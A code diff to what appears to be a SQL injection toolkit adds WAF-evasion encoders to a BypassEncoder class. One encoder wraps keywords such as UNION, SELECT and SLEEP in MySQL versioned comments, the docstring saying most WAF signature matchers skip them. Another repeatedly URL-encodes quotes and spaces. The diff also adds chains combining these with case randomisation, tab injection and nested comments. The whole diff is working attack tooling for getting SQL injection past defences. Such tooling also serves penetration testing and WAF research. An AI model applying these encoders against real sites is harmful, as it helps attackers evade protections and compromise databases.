@@ -428,6 +428,21 @@ class BypassEncoder:
         s = s.replace("1=2", "(select 1)=(select 2)")
         return s
 
+    @staticmethod
+    def versioned_comment(s: str) -> str:
+        """MySQL versioned comments /*!50000SELECT*/ - executed by MySQL,
+        skipped by most WAF signature matchers."""
+        for kw in ("UNION", "SELECT", "FROM", "WHERE", "OR", "AND", "SLEEP",
+                   "ORDER", "BY", "HAVING", "GROUP", "NULL", "INSERT",
+                   "UPDATE", "DELETE", "INTO", "VALUES", "BENCHMARK"):
+            s = re.sub(r"\b%s\b" % kw, "/*!50000%s*/" % kw, s)
+        return s
+
+    @staticmethod
+    def redundant_url_encode(s: str) -> str:
+        """Encode a single high-risk char repeatedly (%2527-style)."""
+        return s.replace("'", "%2527").replace('"', "%2522").replace(" ", "%2520")
+
 
 SQL_COMMENT_ENC = {
     "inline": lambda s: s.replace("OR ", "O/**/R ").replace("AND ", "AN/**/D "),
@@ -452,6 +467,10 @@ ENCODER_CHAINS = [
     [BypassEncoder.logical_swaps, SQL_COMMENT_ENC["inline"]],
     [BypassEncoder.eq_to_like, BypassEncoder.case_random],
     [BypassEncoder.scientific_notation, SQL_COMMENT_ENC["inline"]],
+    [BypassEncoder.versioned_comment, BypassEncoder.case_random],
+    [BypassEncoder.versioned_comment, BypassEncoder.tab_injection],
+    [BypassEncoder.redundant_url_encode, BypassEncoder.case_random],
+    [BypassEncoder.redundant_url_encode, SQL_COMMENT_ENC["nested_mysql"]],
     [BypassEncoder.negative_sign, SQL_COMMENT_ENC["inline"]],
     [BypassEncoder.url_encode, BypassEncoder.null_bytes, SQL_COMMENT_ENC["inline"]],
     [BypassEncoder.double_url_encode, SQL_COMMENT_ENC["nested_mysql"]],
